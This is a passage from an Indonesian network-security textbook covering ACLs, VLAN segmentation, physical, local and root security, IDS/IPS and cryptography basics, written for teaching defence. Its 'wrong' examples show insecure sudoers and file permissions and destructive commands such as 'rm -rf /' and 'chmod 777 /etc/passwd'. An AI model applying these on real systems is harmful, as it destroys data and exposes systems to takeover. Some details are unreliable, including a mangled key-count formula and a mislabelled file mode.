     └───────┬───────┘
       Yes ↙  ↖ No
        ↓        ↓
    [ALLOW]  [QUARANTINE]
     Full        Limited
    Access      Access
```

**Contoh solusi NAC:**
- Cisco Identity Services Engine (ISE)
- Fortinet FortiNAC
- Arista CloudVision
- Microsoft Intune (untuk Azure AD)

### 2.5.1 Access Control Lists (ACL)

**Access Control Lists (ACL)** adalah aturan-aturan yang mendefinisikan user atau device mana yang dapat mengakses resource tertentu dalam jaringan. ACL adalah mekanisme fundamental untuk mengimplementasikan prinsip "least privilege" (akses minimal yang diperlukan).

#### **CONTOH PENERAPAN SALAH vs BENAR**

**❌ PENERAPAN SALAH (Implicit Allow):**
```
Route ACL Configuration:

  permit ip any any     ← ALLOW EVERYTHING!
  deny ip 10.0.0.0 0.0.0.255 192.168.0.0 0.0.0.255

Problem:
✗ Default adalah ALLOW (default open)
✗ Hanya block specific traffic (reactive approach)
✗ New attack vectors tidak tercakup
✗ Jika rule list long, attacker bisa bypass
✗ Sulit untuk maintain dan audit
```

**✅ PENERAPAN BENAR (Explicit Allow / Zero Trust):**
```
Route ACL Configuration:

  ! HTTP access (port 80)
  permit tcp 192.168.1.0 0.0.0.255 10.0.0.0 0.0.0.255 eq 80
  permit tcp 192.168.2.0 0.0.0.255 10.0.0.0 0.0.0.255 eq 80
  
  ! HTTPS access (port 443)
  permit tcp 192.168.1.0 0.0.0.255 10.0.0.0 0.0.0.255 eq 443
  permit tcp 192.168.2.0 0.0.0.255 10.0.0.0 0.0.0.255 eq 443
  
  ! SSH access (restricted IPs only)
  permit tcp 10.1.1.0 0.0.0.255 10.0.0.0 0.0.0.255 eq 22
  
  ! Database access (internal only)
  permit tcp 10.2.0.0 0.0.0.255 10.0.3.0 0.0.0.255 eq 3306
  
  ! DENY EVERYTHING ELSE
  deny ip any any       ← DEFAULT DENY (secure default)

Benefit:
✓ Explicit allow (proactive approach)
✓ "Deny by default, allow on need-to-know basis"
✓ More secure dan maintainable
✓ Principle of least privilege enforced
```

**Jenis-jenis ACL:**

#### a. Standard ACL
Berdasarkan IP source address saja:
```
Access-list 1 permit 192.168.1.0 0.0.0.255
Access-list 1 deny any
```

#### b. Extended ACL
Mempertimbangkan source IP, destination IP, protocol, dan port:
```
Access-list 100 permit tcp 192.168.1.0 0.0.0.255 10.0.0.0 0.0.0.255 eq 80
Access-list 100 deny ip any any
```

#### c. Named ACL
Menggunakan nama deskriptif untuk lebih jelas:
```
ip access-list extended web-traffic
  permit tcp 192.168.1.0 0.0.0.255 10.0.0.0 0.0.0.255 eq 80
  permit tcp 192.168.1.0 0.0.0.255 10.0.0.0 0.0.0.255 eq 443
```

**Penempatan ACL pada Jaringan:**

```
┌─────────────────────────────────────────────────┐
│       ACL Placement dalam Network Topology      │
└─────────────────────────────────────────────────┘

Internet
   │
   ├─── [Firewall dengan ACL] ◄─── Mengontrol traffic masuk/keluar
   │
   ├─── [Router Perimeter]
   │         │
   │    ┌────┴─────────────┐
   │    │                  │
   ├─ [Router dengan ACL]  ├─ [Router dengan ACL]
   │    │                  │
   │    ├─ VLAN Sales      ├─ VLAN IT
   │    │ (Limited access) │ (Full access)
   │    │                  │
   │    └─ ACL:            └─ ACL:
   │      ✗ DB Server       ✓ All resources
   │      ✓ File Server     ✓ Admin tools
   │                        ✓ Development
```

**Best Practices untuk ACL:**
- Gunakan explicit deny pada akhir (security best practice)
- Order rules dari specific ke general
- Test ACL sebelum deployment ke production
- Document setiap ACL rules
- Review dan update ACL secara berkala

### 2.5.2 Network Segmentation & VLAN

**Network Segmentation** adalah proses membagi jaringan menjadi beberapa sub-network (segments) yang lebih kecil untuk meningkatkan security dan performance.

#### **CONTOH PENERAPAN SALAH vs BENAR**

**❌ PENERAPAN SALAH (Flat Network):**
```
Single Network: 192.168.0.0/16

├─ Server room (Database, Web, File)
├─ Desktops (Sales, IT, Finance)
├─ Printers
├─ Security cameras
├─ Guest WiFi
└─ IoT devices (coffee machine, etc)

RISIKO:
✗ Laptop dengan malware dapat spread ke DB server
✗ Guest dapat access Finance data
✗ Lateral movement: attacker can go anywhere
✗ Breach di satu segment = breach di semua
✗ DDoS dari IoT devices affects semua users
```

**✅ PENERAPAN BENAR (Multiple VLANs):**
```
Core Switch dengan VLAN:

├─ VLAN 10 (Management): 10.1.0.0/24
│  └─ Access: IT team only
├─ VLAN 20 (Web Tier): 10.2.0.0/24
│  └─ Rules: Only HTTP/HTTPS dari public internet
├─ VLAN 30 (Database): 10.3.0.0/24
│  └─ Rules: Only from Web tier (10.2.0.0/24)
├─ VLAN 40 (Employee): 10.4.0.0/24
│  └─ Rules: Internet access + File server
├─ VLAN 50 (IoT): 10.5.0.0/24
│  └─ Rules: Isolated, limited functions only
└─ VLAN 99 (Guest): 10.99.0.0/24
   └─ Rules: Internet only, NO internal access

InterVLAN Rules (Firewall):

  10.2.0.0/24 (Web)  → 10.3.0.0/24 (DB)     : ALLOW port 3306
  10.4.0.0/24 (Emp)  → 10.2.0.0/24 (Web)    : ALLOW port 80/443
  10.99.0.0/24 (Guest) → 0.0.0.0/0 (Internet): ALLOW
  All others                                 : DENY

BENEFIT:
✓ Malware in Employee VLAN cannot reach Database
✓ Guest WiFi breach doesn't affect internal systems
✓ Lateral movement extremely difficult
✓ Each VLAN can have different security policy
```

**Benefits dari Network Segmentation:**
- **Reduced Attack Surface**: Jika satu segment terkompromisi, attacker tidak bisa langsung akses segment lain
- **Lateral Movement Prevention**: Mencegah pergerakan horizontal attacker dalam network
- **Improved Performance**: Traffic dikontrol hanya untuk segment yang relevan
- **Compliance**: Memisahkan data sensitive sesuai regulatory requirements
- **Simplified Management**: Lebih mudah manage security policy per segment

**Implementasi dengan VLAN (Virtual LAN):**

```
┌─────────────────────────────────────────────────┐
│    Network Segmentation dengan VLAN             │
└─────────────────────────────────────────────────┘

        ┌──────────────────────────────┐
        │     Core Network Switch      │
        └──────────┬─────────────────┬─┘
                   │                 │
          ┌────────▼──────┐  ┌──────▼────────┐
          │  VLAN 10      │  │  VLAN 20      │
          │  Sales Dept   │  │  IT Dept      │
          │               │  │               │
          │  ✓ Access:    │  │  ✓ Access:    │
          │  - File Srv   │  │  - All Svr    │
          │  - Internet   │  │  - Database   │
          │               │  │  - Admin      │
          │  ✗ Blocked:   │  │               │
          │  - Database   │  │  ✗ Blocked:   │
          │  - Admin      │  │  - None       │
          └───────┬───────┘  └────┬──────────┘
                  │                │
        ┌─────────▼──────┐  ┌──────▼────────┐
        │  VLAN 30       │  │  VLAN 99      │
        │  Finance       │  │  Guest WiFi   │
        │                │  │               │
        │  ✓ Access:     │  │  ✓ Access:    │
        │  - File Srv    │  │  - Internet   │
        │  - Database    │  │               │
        │  - Accounting  │  │  ✗ Blocked:   │
        │                │  │  - All corp   │
        │  ✗ Blocked:    │  │  - Services   │
        │  - IT Network  │  │               │
        └────────────────┘  └────────────────┘
```

**Types of Network Segmentation:**

1. **DMZ (Demilitarized Zone)**
   - Zone antara internal network dan internet
   - Berisi public-facing servers (web, DNS, email)
   - Terisolasi dari internal network melalui firewall

2. **User Segmentation**
   - Pisahkan berdasarkan department/role
   - Sales, Finance, HR, IT masing-masing punya VLAN

3. **Data Classification Segmentation**
   - Public data (accessible to all)
   - Internal data (restricted to employees)
   - Confidential data (restricted to authorized users)
   - Top Secret data (highly restricted, encrypted)

4. **Device Type Segmentation**
   - Corporate devices (laptops, desktops)
   - Guest devices (BYOD, visitor)
   - IoT devices (printers, cameras)
   - Servers dan infrastructure

**VLAN Trunking untuk Inter-Switch Communication:**

```
        Switch 1                Switch 2
    ┌──────────────┐        ┌──────────────┐
    │  VLAN 10     │        │  VLAN 10     │
    │  VLAN 20     │        │  VLAN 20     │
    │  VLAN 30     │◄──────►│  VLAN 30     │
    │  VLAN 99     │ Trunk  │  VLAN 99     │
    │              │ Link   │              │
    └──────────────┘        └──────────────┘
    
Trunk membawa semua VLAN traffic
Tagged dengan VLAN ID untuk identifikasi
```

### 2.5.3 Lapisan Fisik

#### **CONTOH PENERAPAN SALAH vs BENAR**

**❌ PENERAPAN SALAH (No Physical Security):**
```
Server Room:

├─ Pintu: Tidak terkunci (open access)
├─ Siapa saja bisa masuk: Maintenance, guest, cleaning
├─ Servers: Tidak dikunci
├─ Hard disk: Dapat dilepas dari server
├─ BIOS: Tidak password protected
├─ USB ports: Dapat digunakan (USB drop attack)
├─ Keyboards: Anyone dapat gunakan
└─ Access log: TIDAK ADA

RISIKO:
✗ Physical theft: Laptop/hard disk dapat dicuri
✗ Malware injection: Tanam malware di USB
✗ BIOS tampering: Modify BIOS untuk rootkit
✗ Cold boot attack: Copy memory dari RAM
✗ Credential access: Lihat sticky notes dengan password
```

**✅ PENERAPAN BENAR (Physical Security):**
```
Access Control:

├─ Door: Card reader + PIN (multi-factor)
├─ Biometric: Fingerprint atau face recognition
├─ Log: All access logged + timestamped
├─ Camera: CCTV 24/7 (recordings 30 days)
├─ Escort: Visitors must be escorted
└─ Badge: ID badges required

Server Room Security:

├─ Environmental:
│  ├─ Temperature monitoring
│  ├─ Smoke detection + fire suppression
│  └─ Water leak detection
├─ Physical protection:
│  ├─ Server racks: Locked (key access)
│  ├─ Hard drives: Encrypted (AES-256)
│  ├─ BIOS: Password protected
│  ├─ Boot password: Required
│  ├─ USB ports: Disabled in BIOS
│  └─ Network cables: Labeled + documented
└─ Backups:
   ├─ Encrypted (AES-256)
   ├─ Locked cabinet
   └─ Offsite copies in secure vault

Hardware Decommissioning:

├─ Hard drive: DBAN (Darik's Boot and Nuke) wipe
├─ Verification: No data recoverable
├─ Certificate: Issued for audit trail
└─ Tracking: Asset inventory verified

BENEFIT:
✓ Physical theft detected immediately
✓ Unauthorized access prevented
✓ BIOS rootkit prevented
✓ Cold boot attack prevented
✓ Malware USB injection prevented
✓ Accountability: Know who accessed what
```

**Membatasi akses fisik ke mesin:**
- Akses masuk ke ruangan komputer
- Penguncian komputer secara hardware
- Keamanan BIOS
- Keamanan Bootloader
- Back-up data:
  - Pemilihan piranti back-up
  - Penjadwalan back-up

**Mendeteksi gangguan fisik:**
- Log file:
  - Log pendek atau tidak lengkap
  - Log yang berisikan waktu yang aneh
  - Log dengan permisi atau kepemilikan yang tidak tepat
  - Catatan pelayanan reboot atau restart
  - Log yang hilang
  - Masukan su atau login dari tempat yang janggal
- Mengontrol akses sumber daya

### 2.5.4 Keamanan Local

Berkaitan dengan user dan hak-haknya, prinsip least privilege diterapkan pada level sistem operasi.

#### **CONTOH PENERAPAN SALAH vs BENAR**

**❌ PENERAPAN SALAH (All Admin Privileges):**
```
User Account Management:

└─ User Accounts:
   ├─ admin: sudoers ALL=(ALL) NOPASSWD:ALL
   ├─ john: sudoers ALL=(ALL) NOPASSWD:ALL
   ├─ sarah: sudoers ALL=(ALL) NOPASSWD:ALL
   └─ Semua user bisa run everything tanpa password

File Permissions:
   ├─ /etc/sudoers: chmod 666 (world readable!)
   ├─ Configuration files: chmod 644 (world readable)
   └─ Database files: chmod 777 (everyone can access)

Login Policy:
   ├─ Password policy: TIDAK ADA
   ├─ Failed login limit: TIDAK ADA
   ├─ Account lockout: TIDAK ADA
   └─ Password aging: TIDAK ADA

RISIKO:
✗ User mistake → unlimited damage (run rm -rf /)
✗ Malware dalam user account → same privilege as admin
✗ Privilege escalation → attacker easily become admin
✗ No accountability → can't trace who did what
```

**✅ PENERAPAN BENAR (Role-Based Access Control):**
```
User Account Management:

└─ User Accounts:
   ├─ admin: sudoers /usr/sbin/restart-apache2
   │  └─ Only specific commands, require password
   ├─ john: sudoers /usr/bin/systemctl,/usr/sbin/iptables
   │  └─ Limited to needed commands for their job
   ├─ sarah: (no sudo) - regular user
   │  └─ Only access her own files
   └─ Database user: ONLY access database tools
      └─ Cannot run shell commands

File Permissions:
   ├─ /etc/sudoers: chmod 440 (root only)
   ├─ Configuration files: chmod 640 (owner:group only)
   ├─ Database files: chmod 600 (owner only)
   └─ Executable scripts: chmod 750 (no world access)

Login Policy:
   ├─ Password policy: Min 12 chars, complexity
   ├─ Failed login limit: 3 failures → account locked
   ├─ Account lockout: 30 minutes lockout
   ├─ Password aging: Expire every 90 days
   ├─ Sudo session: Timeout after 5 minutes
   └─ Session logging: All sudo commands logged

BENEFIT:
✓ User mistake → limited to their own files
✓ Malware in user account → cannot become admin
✓ Privilege escalation prevented
✓ All actions logged → full accountability
✓ Job separation → sales cannot access finance data
```

Berkaitan dengan user dan hak-haknya:

- Beri mereka fasilitas minimal yang diperlukan.
- Hati-hati terhadap saat/dari mana mereka login, atau tempat seharusnya mereka login.
- Pastikan dan hapus rekening mereka ketika mereka tidak lagi membutuhkan akses.

### 2.5.5 Keamanan Root

#### **CONTOH PENERAPAN SALAH vs BENAR**

**❌ PENERAPAN SALAH (Unrestricted Root Usage):**
```
Root Access:

└─ Root Usage:
   ├─ Always login as root directly
   ├─ Telnet/SSH login as root (cleartext/unencrypted)
   ├─ Run all commands as root (even simple ones)
   ├─ No audit logging (audit disabled)
   ├─ No session recording
   ├─ PATH includes current directory (.)
   └─ No timeout (session stays open forever)

Example of Dangerous Commands:
   ├─ rm -rf * (delete everything)
   ├─ kill -9 $(lsof -t /home) (kill processes carelessly)
   ├─ chmod 777 /etc/passwd (make password file world-writable)
   └─ BIOS modifications without logging

RISIKO:
✗ Accidental system damage: rm -rf / delete entire OS
✗ Typos in commands → catastrophic consequences
✗ Malware in root shell → full system compromise
✗ No audit trail → cannot trace what happened
✗ Password file world-writable → anyone can become root
```

**✅ PENERAPAN BENAR (Restricted Root Usage with sudo):**
```
Root Access:

└─ Root Usage Best Practices:
   ├─ Never directly login as root
   ├─ Always use regular account + sudo
   ├─ SSH login disabled for root
   ├─ Sudo session logging enabled
   └─ Session recording (script/asciinema)

Sudo Configuration (/etc/sudoers):

   # apache group can restart apache only
   %apache ALL=(ALL) /usr/sbin/systemctl restart apache2

   # database group can restart mysql only
   %database ALL=(ALL) /usr/sbin/systemctl restart mysql

   # backups user can run backup script only
   backup ALL=(ALL) /usr/local/bin/backup.sh

   # ALL sudo commands require password
   Defaults use_pty
   Defaults log_output
   Defaults logfile="/var/log/sudo.log"

Session Timeout:
   ├─ Sudo timeout: 5 minutes
   ├─ Session timeout: 10 minutes idle
   └─ Re-authenticate: Requires password again

Command Verification (before executing):
   # First check what will be deleted:
   $ ls foo*.bak
   
   # Then safely delete:
   $ rm foo*.bak

Audit Logging:
   └─ All sudo commands logged:
      ```
      [2024-01-15 10:32:15] john : TTY=pts/0 ; PWD=/home/john ;
                           USER=root ; COMMAND=/usr/sbin/systemctl restart apache2
      ```

BENEFIT:
✓ Accidental damage prevented (regular account sandbox)
✓ Typo consequences limited (only allowed commands)
✓ Malware containment (cannot escalate to root)
✓ Full audit trail (know exactly what admin did)
✓ Command accountability (who, what, when, where)
```

**Best Practices untuk Root Security:**

- Ketika melakukan perintah yang kompleks, cobalah dalam cara yang tidak merusak dulu, terutama perintah yang menggunakan globbing. Contoh, anda ingin melakukan `rm foo*.bak`, pertama coba dulu: `ls foo*.bak` dan pastikan anda ingin menghapus file-file yang anda pikirkan.

- Beberapa orang merasa terbantu ketika melakukan `touch /-i` pada sistem mereka. Hal ini akan membuat perintah-perintah seperti `rm fr *` menanyakan apakah anda benar-benar ingin menghapus seluruh file. (Shell anda menguraikan "-i" dulu, dan memberlakukannya sebagai option -i ke rm).

- Hanya menjadi root ketika melakukan tugas tunggal tertentu. Jika anda berusaha mengetahui bagaimana melakukan sesuatu, kembali ke shell pemakai normal hingga anda yakin apa yang perlu dilakukan oleh root.

- Jalur perintah untuk pemakai root sangat penting. Jalur perintah, atau variabel lingkungan PATH mendefinisikan lokal yang dicari shell untuk program. Cobalah dan batasi jalur perintah bagi pemakai root sedapat mungkin, dan jangan pernah menggunakan '.', yang berarti 'direktori saat ini', dalam pernyataan PATH anda. Sebagai tambahan, jangan pernah menaruh direktori yang dapat ditulis pada jalur pencarian anda, karena hal ini memungkinkan penyerang memodifikasi atau menaruh file biner dalam jalur pencarian anda, yang memungkinkan mereka menjadi root ketika anda menjalankan perintah tersebut.

- Jangan pernah menggunakan seperangkat utilitas rlogin/rsh/rexec (disebut utilitas r) sebagai root. Mereka menjadi sasaran banyak serangan, dan sangat berbahaya bila dijalankan sebagai root. Jangan membuat file .rhosts untuk root.

- File `/etc/securetty` berisikan daftar terminal-terminal tempat root dapat login. Secara baku (pada RedHat Linux) diset hanya pada konsol virtual lokal (vty). Berhati-hatilah saat menambahkan yang lain ke file ini. Anda seharusnya login dari jarak jauh sebagai pemakai biasa dan kemudian 'su' jika anda butuh (mudah-mudahan melalui ssh atau saluran terenkripsi lain), sehingga tidak perlu untuk login secara langsung sebagai root.

- Selalu perlahan dan berhati-hati ketika menjadi root. Tindakan anda dapat mempengaruhi banyak hal. Pikir sebelum anda mengetik!

### 2.5.6 Keamanan File dan System File

- Directory home user tidak boleh mengakses perintah mengubah system seperti partisi, perubahan device dan lain-lain.
- Lakukan setting limit system file.
- Atur akses dan permission file: read, write, execute bagi user maupun group.
- Selalu cek program-program yang tidak dikenal.

### 2.5.7 Keamanan Password dan Enkripsi

- Hati-hati terhadap bruto force attack dengan membuat password yang baik.
- Selalu mengenkripsi file yang dipertukarkan.
- Lakukan pengamanan pada level tampilan, seperti screen saver.

### 2.5.8 Keamanan Kernel

- Selalu update kernel system operasi.
- Ikuti review bugs dan kekurangan pada system operasi.

### 2.5.9 Keamanan Jaringan

- Waspadai paket sniffer yang sering menyadap port Ethernet.
- Lakukan prosedur untuk mengecek integritas data.
- Verifikasi informasi DNS.
- Lindungi network file system.
- Gunakan firewall untuk barrier antara jaringan privat dengan jaringan eksternal.

Keamanan Informasi merupakan salah satu kunci yang dapat mempengaruhi tingkat Reliability (termasuk performa dan availability) suatu jaringan. Untuk mengatasi masalah keamanan jaringan dan komputer ada banyak pendekatan yang dapat dilakukan. Salah satunya adalah dengan menggunakan sistem IDS (Intrusion Detection System) dan IPS (Intrusion Prevention System).

### 2.5.10 Sistem IDS dan IPS

Seiring dengan Perkembangan Teknologi Informasi menjadikan keamanan suatu informasi sangatlah penting terlebih lagi pada suatu jaringan yang terkoneksi dengan internet. Karena itu telah berkembang teknologi IDS dan IPS sebagai pembantu pengaman data pada suatu jaringan komputer.

Dengan adanya Intrusion Detection System (IDS) dan Intrusion Prevention System (IPS), maka serangan-serangan tersebut lebih dapat dicegah ataupun dihilangkan. IDS berguna untuk mendeteksi adanya serangan dari penyusup (serangan dari dalam), sedangkan IPS berguna untuk mendeteksi serangan dan menindaklanjutinya dengan pemblokan (filter) serangan. IDS dan IPS secara umum dikenal sebagai IDPS (Intrusion Detection and Prevention Systems).

**IDS (Intrusion Detection System)** adalah sebuah sistem yang melakukan pengawasan terhadap lalu lintas (traffic) jaringan dan pengawasan terhadap kegiatan-kegiatan yang mencurigakan didalam sebuah sistem jaringan. Jika ditemukan kegiatan-kegiatan yang mencurigakan berhubungan dengan lalu lintas jaringan, maka IDS akan memberikan peringatan kepada sistem atau administrator jaringan. Dalam banyak kasus IDS juga merespon terhadap lalu lintas yang tidak normal / anomali melalui aksi pemblokiran user atau alamat IP (Internet Protocol) yang melakukan usaha pengaksesan jaringan tersebut.

**IPS (Intrusion Prevention System)** adalah sebuah sistem yang menggabungkan fungsi firewall dan fungsi IDS dengan proporsional. Teknologi ini dapat digunakan untuk mencegah serangan yang akan masuk ke jaringan lokal dengan memeriksa dan mencatat semua paket data serta mengenali paket dengan sensor, disaat serangan telah teridentifikasi, IPS akan menolak akses (block) dan mencatat (log) semua paket data yang teridentifikasi tersebut.

Jadi IPS bertindak seperti layaknya firewall yang akan melakukan allow dan block yang dikombinasikan dengan IDS yang dapat mendeteksi paket secara detail. IPS menggunakan signatures dari paket untuk mendeteksi aktivitas lalu lintas di jaringan dan terminal, dimana pendeteksian paket yang masuk dan keluar (inbound-outbound) dapat di cegah sedini mungkin sebelum merusak atau mendapatkan akses ke dalam jaringan lokal. Jadi early detection dan prevention menjadi penekanan pada IPS ini.

#### 2.5.10.1 Metode Deteksi

IDPS memiliki 3 metode untuk melakukan deteksi, yaitu:

#### 1. Signature-Based Detection

Metode ini dilakukan dengan membandingkan signature dari setiap paket untuk mengidentifikasi kemungkinan adanya intrusi. Metode ini efektif bila IDPS mendeteksi ancaman yang sudah di kenal, tetapi tidak efektif bila ancamannya baru atau tidak di kenal oleh IDPS.

Pengertian dikenal dalam konteks ini adalah sudah pernah terjadi sebelumnya. Metode ini merupakan metode yang paling sederhana, karena hanya membandingkan paket data, lalu di daftarkan menggunakan operasi perbandingan. Kelemahannya adalah metode ini tidak dapat melacak kejadian yang terjadi pada komunikasi yang lebih kompleks.

#### 2. Anomaly-Based Detection

Metode ini digunakan dengan membandingkan kegiatan yang sedang di pantau dengan kegiatan yang di anggap normal untuk mendeteksi adanya penyimpangan. Pada metode ini, IDPS memiliki profil yang mewakili perilaku yang normal dari user, host, koneksi jaringan dan aplikasi. Profil tersebut didapat dari hasil pemantauan karakteristik dari suatu kegiatan dalam selang waktu tertentu.

Kelebihan dari metode ini adalah efektif dalam mendeteksi ancaman yang belum dikenal, contohnya ketika jaringan diserang oleh tipe intrusi yang baru. Sedangkan kekurangan dari metode ini adalah dalam beberapa kasus, akan sulit untuk mendapatkan deteksi yang akurat dalam komunikasi yang lebih kompleks.

#### 3. Stateful Protocol Analysis

Metode ini sebenarnya menyerupai anomaly-based, yaitu membandingkan profil yang sudah ada dengan kegiatan yang sedang berlangsung untuk mengidentifikasi penyimpangan. Namun, tidak seperti Anomaly-Based Detection yang menggunakan profil host, Stateful Protocol Analysis menggunakan profil yang lebih luas yang dapat merinci bagaimana sebuah protokol yang istimewa dapat digunakan atau tidak.

Arti "Stateful" disini adalah sistem di IDPS ini bisa memahami dan melacak situasi pada protokol network, transport dan application.

Kelebihan dari metode ini adalah dapat mengidentifikasi rangkaian perintah yang tidak terduga seperti mengeluarkan perintah yang sama berulang-ulang. Sedangkan kekurangannya adalah kemungkinan terjadinya bentrokan antara protokol yang digunakan oleh IDPS dengan protokol umum yang digunakan oleh sistem operasi, atau dengan kata lain sulit membedakan implementasi client dan server pada interaksi protokol. (Informasi 2013)

---

## 3.1 Kriptografi

### 3.1.1 Sejarah Kriptografi

Kata kriptografi berasal dari bahasa Yunani, "kryptós" yang berarti tersembunyi dan "gráphein" yang berarti tulisan. Kriptografi telah digunakan oleh Julius Caesar sejak zaman Romawi Kuno. Teknik ini dijuluki Caesar cipher untuk mengirim pesan secara rahasia, meskipun teknik yang digunakannya sangat tidak memadai untuk ukuran kini. (Kriptografi 2020)

Casanova menggunakan pengetahuan mengenai kriptografi untuk mengelabui Madame d'Urfe (ia mengatakan kepada Madame d'Urfe bahwa sesosok jin memberi tahu kunci rahasia Madame d'Urfe kepadanya, padahal ia berhasil memecahkan kunci rahasia berdasarkan pengetahuannya mengenai kriptografi), sehingga ia mampu mengontrol kehidupan Madame d'Urfe secara total. (Kromodimoeljo, 2010).

### 3.1.2 Pengertian Kriptografi

Kriptografi adalah ilmu mengenai teknik enkripsi dimana "naskah asli" (plaintext) diacak menggunakan suatu kunci enkripsi menjadi "naskah acak yang sulit dibaca" (ciphertext) oleh seseorang yang tidak memiliki kunci dekripsi. Dekripsi menggunakan kunci dekripsi bisa mendapatkan kembali data asli. Probabilitas mendapat kembali naskah asli oleh seseorang yang tidak mempunyai kunci dekripsi dalam waktu yang tidak terlalu lama adalah sangat kecil.

Teknik enkripsi yang digunakan dalam kriptografi klasik adalah enkripsi simetris dimana kunci dekripsi sama dengan kunci enkripsi. Untuk public key cryptography, diperlukan teknik enkripsi asimetris dimana kunci dekripsi tidak sama dengan kunci enkripsi. Enkripsi, dekripsi dan pembuatan kunci untuk teknik enkripsi asimetris memerlukan komputasi yang lebih intensif dibandingkan enkripsi simetris, karena enkripsi asimetris menggunakan bilangan-bilangan yang sangat besar. (Kromodimoeljo, 2010).

### 3.1.3 Aspek Keamanan Kriptografi

Kriptografi memiliki beberapa aspek keamanan antara lain:

- **Kerahasiaan (confidentiality)**: Menjamin bahwa data-data tersebut hanya bisa diakses oleh pihak-pihak tertentu saja. Kerahasiaan bertujuan untuk melindungi suatu informasi dari semua pihak yang tidak berhak atas informasi tersebut.

- **Otentikasi (authentication)**: Merupakan identifikasi yang dilakukan oleh masing-masing pihak yang saling berkomunikasi, maksudnya beberapa pihak yang berkomunikasi harus mengidentifikasi satu sama lainnya. Informasi yang didapat oleh suatu pihak dari pihak lain harus diidentifikasi untuk memastikan keaslian dari informasi yang diterima.

- **Integritas (integrity)**: Menjamin setiap pesan yang dikirim pasti sampai pada penerimanya tanpa ada bagian dari pesan tersebut yang diganti, diduplikasi, dirusak, diubah urutannya, dan ditambahkan. Integritas data bertujuan untuk mencegah terjadinya pengubahan informasi oleh pihak-pihak yang tidak berhak atas informasi tersebut. Untuk menjamin integritas data ini pengguna harus mempunyai kemampuan untuk mendeteksi terjadinya manipulasi data oleh pihak-pihak yang tidak berkepentingan. Manipulasi data yang dimaksud di sini meliputi penyisipan, penghapusan, maupun penggantian data.

- **Nirpenyangkalan (Nonrepudiation)**: Mencegah pengirim maupun penerima mengingkari bahwa mereka telah mengirimkan atau menerima suatu pesan. Jika sebuah pesan dikirim, penerima dapat membuktikan bahwa pesan tersebut memang dikirim oleh pengirim yang tertera. Sebaliknya, jika sebuah pesan diterima, pengirim dapat membuktikan bahwa pesannya telah diterima oleh pihak yang ditujunya. (Ariyus, 2008).

## 3.2 Cryptosystem

Cryptographic system (kriptografi sistem) atau cryptosystem (kriptosistem) adalah suatu fasilitas untuk mengkonversikan plaintext ke ciphertext dan sebaliknya. Dalam sistem ini, seperangkat parameter yang menentukan transformasi pencipheran tertentu disebut suatu set kunci. Proses enkripsi dan dekripsi diatur oleh satu atau beberapa kunci kriptografi.

## 3.3 Karakteristik Cryptosystem

Karakteristik Cryptosystem yang baik:

- Keamanan sistem terletak pada kerahasiaan kunci dan bukan pada kerahasiaan algoritma yang digunakan.
- Cryptosystem yang baik memiliki ruang kunci (keyspace) yang besar.
- Cryptosystem yang baik akan menghasilkan ciphertext yang terlihat acak dalam seluruh tes statistik yang dilakukan terhadapnya.
- Cryptosystem yang baik mampu menahan seluruh serangan yang telah dikenal sebelumnya.

## 3.4 Macam-macam Cryptosystem

### 1. Symmetric Cryptosystem

Dalam symmetric cryptosystem ini, kunci yang digunakan untuk proses enkripsi dan dekripsi pada prinsipnya identik, tetapi satu buah kunci dapat pula diturunkan dari kunci yang lainnya. Kunci-kunci ini harus dirahasiakan. Oleh karena itulah sistem ini sering disebut sebagai secret-key ciphersystem.

Jumlah kunci yang dibutuhkan umumnya adalah:

$$n C_2^2 = n(n-1)$$

dengan n menyatakan banyaknya pengguna. Contoh dari sistem ini adalah Data Encryption Standard (DES), Blowfish, IDEA.

### 2. Asymmetric Cryptosystem

Dalam asymmetric cryptosystem ini digunakan dua buah kunci. Satu kunci yang disebut kunci publik (public key) dapat dipublikasikan, sedang kunci yang lain yang disebut kunci privat (private key) harus dirahasiakan. Proses menggunakan sistem ini dapat diterangkan secara sederhana sebagai berikut: bila A ingin mengirimkan pesan kepada B, A dapat menyandikan pesannya dengan menggunakan kunci publik B, dan bila B ingin membaca surat tersebut, ia perlu mendekripsikan surat itu dengan kunci privatnya.

Dengan demikian kedua belah pihak dapat menjamin asal surat serta keaslian surat tersebut, karena adanya mekanisme ini. Contoh sistem ini antara lain RSA Scheme dan Merkle-Hellman Scheme.

## 3.5 Protokol Cryptosystem

Cryptographic protocol adalah suatu protokol yang menggunakan kriptografi. Protokol ini melibatkan sejumlah algoritma kriptografi, namun secara umum tujuan protokol lebih dari sekedar kerahasiaan. Pihak-pihak yang berpartisipasi mungkin saja ingin membagi sebagian rahasianya untuk menghitung sebuah nilai, menghasilkan urutan random, atau pun menandatangani kontrak secara bersamaan.

Penggunaan kriptografi dalam sebuah protokol terutama ditujukan untuk mencegah atau pun mendeteksi adanya eavesdropping dan cheating.¹¹

## 3.6 Jenis Penyerangan Pada Protokol

Jenis-jenis penyerangan pada protocol:

- **Ciphertext-only attack**: Dalam penyerangan ini, seorang cryptanalyst memiliki ciphertext dari sejumlah pesan yang seluruhnya telah dienkripsi menggunakan algoritma yang sama.

- **Known-plaintext attack**: Dalam tipe penyerangan ini, cryptanalyst memiliki akses tidak hanya ke ciphertext sejumlah pesan, namun ia juga memiliki plaintext pesan-pesan tersebut.

- **Chosen-plaintext attack**: Pada penyerangan ini, cryptanalyst tidak hanya memiliki akses atas ciphertext dan plaintext untuk beberapa pesan, tetapi ia juga dapat memilih plaintext yang dienkripsi.

- **Adaptive-chosen-plaintext attack**: Penyerangan tipe ini merupakan suatu kasus khusus chosen-plaintext attack. Cryptanalyst tidak hanya dapat memilih plaintext yang dienkripsi, ia pun memiliki kemampuan untuk memodifikasi pilihan berdasarkan hasil enkripsi sebelumnya. Dalam chosen-plaintext attack, cryptanalyst mungkin hanya dapat memiliki plaintext dalam suatu blok besar untuk dienkripsi; dalam adaptive-chosen-plaintext attack ini ia dapat memilih blok plaintext yang lebih kecil dan kemudian memilih yang lain berdasarkan hasil yang pertama, proses ini dapat dilakukannya terus menerus hingga ia dapat memperoleh seluruh informasi.

- **Chosen-ciphertext attack**: Pada tipe ini, cryptanalyst dapat memilih ciphertext yang berbeda untuk didekripsi dan memiliki akses atas plaintext yang didekripsi.

- **Chosen-key attack**: Cryptanalyst pada tipe penyerangan ini memiliki pengetahuan tentang hubungan antara kunci-kunci yang berbeda.

- **Rubber-hose cryptanalysis**: Pada tipe penyerangan ini, cryptanalyst mengancam, memeras, atau bahkan memaksa seseorang hingga mereka memberikan kuncinya.

## 3.7 Jenis Penyerangan Pada Jalur Komunikasi

Penyerangan pada jalur komunikasi:

